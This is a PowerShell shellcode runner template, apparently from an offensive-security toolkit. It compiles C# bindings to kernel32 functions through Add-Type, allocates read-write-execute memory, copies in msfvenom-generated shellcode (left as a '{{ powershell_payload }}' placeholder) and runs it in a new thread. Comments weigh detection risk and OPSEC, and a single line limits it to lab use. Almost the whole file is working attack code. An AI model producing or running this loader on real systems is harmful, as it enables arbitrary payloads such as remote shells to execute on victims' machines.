# PowerShell Shellcode Runner using Add-Type
# WARNING: This technique leaves disk artifacts and is easily detected
# Use only for testing/lab environments

# Define C# class containing P/Invoke declarations for Windows API functions
$Kernel32 = @"
using System;
using System.Runtime.InteropServices;

public class Kernel32 {
    // Allocate memory in the current process's virtual address space
    // Parameters:
    //   lpAddress: Starting address (0 = let system choose)
    //   dwSize: Size of memory to allocate
    //   flAllocationType: MEM_COMMIT | MEM_RESERVE (0x3000)
    //   flProtect: PAGE_EXECUTE_READWRITE (0x40)
    [DllImport("kernel32")]
    public static extern IntPtr VirtualAlloc(
        IntPtr lpAddress,
        uint dwSize,
        uint flAllocationType,
        uint flProtect
    );
    
    // Create a new thread in the current process
    // Parameters:
    //   lpThreadAttributes: Security attributes (null for default)
    //   dwStackSize: Stack size (0 for default)
    //   lpStartAddress: Starting address (our shellcode)
    //   lpParameter: Parameter to pass to thread (null)
    //   dwCreationFlags: Creation flags (0 = run immediately)
    //   lpThreadId: Receives thread ID (null if not needed)
    [DllImport("kernel32", CharSet=CharSet.Ansi)]
    public static extern IntPtr CreateThread(
        IntPtr lpThreadAttributes,
        uint dwStackSize,
        IntPtr lpStartAddress,
        IntPtr lpParameter,
        uint dwCreationFlags,
        IntPtr lpThreadId
    );
    
    // Wait for a thread/process to complete or timeout
    // Parameters:
    //   hHandle: Handle to thread/process
    //   dwMilliseconds: Timeout in milliseconds (0xFFFFFFFF = INFINITE)
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern UInt32 WaitForSingleObject(
        IntPtr hHandle,
        UInt32 dwMilliseconds
    );
}
"@

# Compile the C# code and make it available in PowerShell
# NOTE: This creates temporary files in %TEMP% - major OPSEC concern
Add-Type $Kernel32

# Shellcode generated by msfvenom
{{ powershell_payload }}

# Get the size of the shellcode
$size = $buf.Length

# Allocate executable memory region
# 0x3000 = MEM_COMMIT | MEM_RESERVE
# 0x40 = PAGE_EXECUTE_READWRITE
[IntPtr]$addr = [Kernel32]::VirtualAlloc(0, $size, 0x3000, 0x40)

# Copy shellcode from managed byte array into the allocated unmanaged memory
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $size)

# Create new thread starting at the shellcode address
# Parameters: default security, default stack, shellcode address, no params, run immediately, no thread ID
$thandle = [Kernel32]::CreateThread(0, 0, $addr, 0, 0, 0)

# Wait indefinitely for the thread to complete
# 0xFFFFFFFF = INFINITE timeout
[Kernel32]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF")
